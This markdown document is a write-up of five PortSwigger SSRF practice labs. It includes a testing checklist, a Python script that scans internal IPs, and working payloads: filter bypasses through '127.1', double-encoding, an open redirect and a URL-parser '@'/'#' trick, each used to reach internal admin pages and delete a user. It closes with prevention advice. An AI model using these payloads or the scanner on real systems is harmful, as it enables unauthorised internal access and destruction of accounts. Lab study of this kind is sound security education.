# Server-Side Request Forgery (SSRF)

> PortSwigger Web Security Academy · **5/7** labs completed

SSRF makes the server send requests to a destination chosen by the attacker, often reaching internal systems that the attacker cannot access directly.

[← Back to the index](README.md)

## Contents

- [How to approach this vulnerability](#how-to-approach-this-vulnerability)
- [1. Basic SSRF against the local server](#1-basic-ssrf-against-the-local-server)
- [2. Basic SSRF against another back-end system](#2-basic-ssrf-against-another-back-end-system)
- [3. SSRF with blacklist-based input filter](#3-ssrf-with-blacklist-based-input-filter)
- [4. SSRF with filter bypass via open redirection vulnerability](#4-ssrf-with-filter-bypass-via-open-redirection-vulnerability)
- [5. SSRF with whitelist-based input filter](#5-ssrf-with-whitelist-based-input-filter)
- [Prevention](#prevention)

## How to approach this vulnerability

Checklist of things to check when you suspect this class of bug, covering the different ways it shows up:

- Find every feature that makes the server fetch a URL on the user's behalf: webhooks, PDF/image generation from a URL, 'import from URL', URL previews, avatar-from-URL.
- Test whether the server will fetch `http://localhost` or `127.0.0.1` and whether an internal port scan is possible by varying the port.
- Test cloud metadata endpoints if the app likely runs in a cloud environment (`169.254.169.254`).
- If direct internal addresses are blocked, test bypasses: alternate IP representations (decimal, octal, hex), `0.0.0.0`, IPv6 shorthand, DNS rebinding, and redirects (register a URL that 302s to the internal target).
- Test blind SSRF where there's no visible response: use an out-of-band listener (Burp Collaborator) to confirm the request fired.
- Check how the URL is parsed: differences between the validating code and the fetching code (different URL parsers, `@`-based user-info tricks, double encoding) are a common bypass source.
- Check if the feature can reach other protocols the whitelist didn't anticipate (`file://`, `gopher://`, `dict://`).
- If a filter blocks on scheme or host, test combining several bypass techniques together (e.g. encoded `#`, then swap host, then add path) since fixes are often partial.

## Lab write-ups

### 1. Basic SSRF against the local server

**Lab:** [Basic SSRF against the local server](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost)

- The vuln exists in check stock endpoint where it takes a url
- Change the url to `http://localhost/admin` and you will be able to see the admin page
- Delete the carlos account suing the payload `http://localhost/admin/delete?username=carlos`

---

### 2. Basic SSRF against another back-end system

**Lab:** [Basic SSRF against another back-end system](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system)

- In this lab the vuln exists in accessing the internal private ranges service which is `192.168.0.x`
- Our job is to find the right ip address where admin service runs
- We can do it using burp intruder or py file

```python
import requests
from concurrent.futures import ThreadPoolExecutor

LAB_URL = "https://YOUR-LAB-ID.web-security-academy.net"
PRODUCT_PATH = "/product/stock"
TIMEOUT = 10

def check_ip(last_octet):
    internal_url = f"http://192.168.0.{last_octet}:8080/admin"

    try:
        response = requests.post(
            LAB_URL + PRODUCT_PATH,
            data={"stockApi": internal_url},
            timeout=TIMEOUT
        )

        print(
            f"192.168.0.{last_octet} -> "
            f"HTTP {response.status_code} | "
            f"Response length: {len(response.text)}"
        )

        if "admin" in response.text.lower():
            print(f"  Possible admin interface at 192.168.0.{last_octet}")

    except requests.RequestException as e:
        print(f"192.168.0.{last_octet} -> Error: {e}")

with ThreadPoolExecutor(max_workers=5) as executor:
    list(executor.map(check_ip, range(1, 256)))
```

- Now we found out it is running on `192.168.0.45`
- Go to `192.168.0.45/admin/delete?username=carlos` to delete the user

---

### 3. SSRF with blacklist-based input filter

**Lab:** [SSRF with blacklist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)

- In this lab there are 2 security features that are implemented for SSRF.
- Blacklisting the IP and URL, double encoding the characters
- The blacklisted ip is `http://127.0.0.1` and it gets blocked
- When I try to access `127.1/` I am able to do it
- So now go to `127.1/admin` and again blocked because of url double encoding
- So change the char `a` and double encode it so `a-> %61` and `%61->%2561`
- So the final payload will be `http://127.1/%2561dmin/delete?username=carlos` to delete the user

---

### 4. SSRF with filter bypass via open redirection vulnerability

**Lab:** [SSRF with filter bypass via open redirection vulnerability](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)

- This lab is vulnerable to open redirection
- The admin services runs on ``http://192.168.0.12:8080/admin`` so we have to add this url in redirection
- When we try to change the url in check stock we were not able to do anything
- There is a new option called next products where it redirects it to the next path. inspect this request
- There is a parameter called path and now change it to `http://192.168.0.12:8080/admin` and we were able to access the admin page
- The redirect path is `/product/nextProduct?currentProductId=1&path=` so add our payload as a value for path
- The payload is `/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin/delete?username=carlos`
- Encode the symbol `&` in the payload because it could take it 2 separate arguments so change the value of `&->%26`
- The actual payload is `/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin/delete?username=carlos` to delete the user carlos

---

### 5. SSRF with whitelist-based input filter

**Lab:** [SSRF with whitelist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter)

- **In this lab, the application uses a whitelist** to restrict which external stock-checking host the server can access.
- When we enter `http://localhost`, the application returns the error:
    `"External stock check host must be stock.weliketoshop.net"`.
    This means the application checks the hostname against a whitelist and allows only `stock.weliketoshop.net`.
- Next, we try the payload:
    `http://username@stock.weliketoshop.net`
    It returns `"could not connect to external server"`. This suggests that the hostname passed the whitelist validation, but the connection failed. The reason is that URLs can contain user information before the `@` character, while the hostname is the part after `@`.
- Now, we add `#` after the username to observe how the URL is parsed. The payload becomes:
    `http://username#@stock.weliketoshop.net`
    The `#` character marks the beginning of the URL fragment. The parser treats `username` as the hostname and the remaining text as part of the fragment. Since `username` is not the allowed hostname, the application rejects the URL.
- This tells us that `#` can change how the URL is interpreted. We need to bypass the whitelist while exploiting the difference between URL parsing and decoding.
- We first URL-encode `#` and try:
    `http://username%23@stock.weliketoshop.net`
    The application still rejects the URL because the encoded character is not interpreted in the way required to bypass the validation.
- Next, we double-URL-encode `#`:
    `http://username%2523@stock.weliketoshop.net`
    Since `%25` represents `%`, `%2523` becomes `%23` after one decoding pass and `#` after another. The application now returns a different error, suggesting that the URL is being processed differently and that the whitelist check may have been passed
- We then replace `username` with `localhost`:
    `http://localhost%2523@stock.weliketoshop.net`
    In this lab, the different URL-processing behavior allows us to reach the internal admin interface despite the whitelist restriction.
- Finally, we append the admin deletion path to the payload:
    `http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos`
    This targets the internal admin endpoint and requests deletion of the user `carlos`.

##### Key Concept

The vulnerability occurs because different components of the application may decode and parse the URL differently. This is called a **URL parsing discrepancy** or **parser differential**.

**Important:** Double encoding does not automatically bypass a whitelist. The bypass depends on the application's specific decoding and parsing sequence. An error message alone also does not prove which host was contacted.

we cannot conclude that using fragments only removes the hostname from the payload and keeps the path

---

## Prevention

How this class of bug is fixed, based on what these labs showed:

- Use an allowlist of permitted hosts and schemes. A blocklist of `localhost` or `127.0.0.1` is easy to bypass.
- Resolve the hostname and check the final IP address. Block private, loopback and link-local ranges (including cloud metadata addresses).
- Do not follow redirects blindly. Re-check the destination after every redirect.
- Parse URLs with one consistent parser. Differences between parsers are the base of many filter bypasses.
- Limit outbound network access from the server, and do not return raw upstream responses to the user.
